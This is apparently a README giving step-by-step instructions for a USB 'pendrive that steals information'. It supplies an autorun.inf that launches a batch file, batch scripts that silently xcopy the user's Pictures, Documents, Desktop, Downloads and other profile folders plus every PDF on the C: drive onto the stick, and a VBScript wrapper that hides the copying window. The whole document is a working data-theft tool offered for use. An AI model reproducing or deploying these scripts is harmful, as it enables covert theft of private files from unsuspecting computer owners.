# Copy_FIles
 pendrive that steals information
Step 1: Materials Needed
           1.USB Pendrive 8 GB or more

Step 2: Create Autorun File(autorun.inf)
	[autorun]
	icon=drive.ico
	open=vamokivamo.bat
	Action=Press ENTER to continue 
	shell\open\command=vamokivamo.bat


Step 3: Make the File for Copy(.chupacabra.bat)
	@echo off
	:: variables
	SET odrive=%odrive:~0,2%
	set backupcmd=xcopy /s /c /d /e /h /i /r /y
	echo off
	%backupcmd% "%USERPROFILE%\pictures" "%drive%\copy\pics"
	%backupcmd% "%USERPROFILE%\Favorites" "%drive%\copy\Favorites"
	%backupcmd% "%USERPROFILE%\videos" "%drive%\copy\vids"
	%backupcmd% "%USERPROFILE%\Download" "%drive%\copy\Download"
	%backupcmd% "%USERPROFILE%\Desktop" "%drive%\copy\Desktop"
	%backupcmd% "%USERPROFILE%\Music" "%drive%\copy\Music"
	%backupcmd% "%USERPROFILE%\Documents" "%drive%\copy\Documents"
	@echo off
	cls

Step 3.1: Make the Copy PDF files(.chupacabrapdf.bat)
	@echo off 
	:: variables 
	SET odrive=%odrive:~0,2% 
	set backupcmd=xcopy /s /c /d /e /h /i /r /y 
	echo off 
	for /r C:\ %%x in (*.pdf) do xcopy %%x "%drive%\copy"
	@echo off 
	cls

Step 4: Make a Script to hide other files(invisible.vbs)
	CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False

Step 5: Make a Batch File(vamokivamo.bat) 
	wscript.exe \invisible.vbs .chupacabra.bat
	
Step 6: Create Directory copy 

Step 7: Put All Files in the Pen Root